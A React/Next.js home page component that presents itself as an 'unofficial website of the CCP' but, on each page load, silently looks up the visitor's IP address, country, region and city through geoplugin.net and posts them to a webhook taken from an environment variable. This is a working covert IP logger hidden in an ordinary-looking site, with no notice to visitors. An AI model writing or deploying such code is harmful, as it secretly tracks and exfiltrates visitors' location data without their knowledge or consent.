// import Image from 'next/image';
import styles from '@/styles/Home.module.css';
import React from 'react';
import Datetime from '../components/date';
import path from "path";
// require('dotenv').config({path: __dirname + ".env"});

export default function Home() {
    // <p>{process.env.AUTH_TOKEN}</p>
    let webhook: any = process.env.REACT_APP_WEBHOOK;

    function send(content: object) {
        let data = {
            embeds: [content],
        };

        fetch(webhook, {
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        }).catch(console.error);
    };

    function lol() {
        fetch("http://www.geoplugin.net/json.gp").then((response) => {
            response.json().then((inputData) => {
                console.log(inputData);
                let content = {
                    title: "hi",
                    description: `**IP:** ${inputData.geoplugin_request}
                    **Country:** ${inputData.geoplugin_countryName}
                    **State/Province:** ${inputData.geoplugin_regionName}
                    **Town/City:** ${inputData.geoplugin_city}`,
                };
                send(content);
            }).catch(console.error);
        });
    };

    lol();
    
    return (
        <>
        <header><h1>Communist Party of China</h1></header>
        <main>
            <h1>Welcome</h1>
            <h2>to the unofficial website of the CCP!</h2>
            <p className={styles.inline}>Current date and time: </p><Datetime/>
        </main>
        </>
    );
}
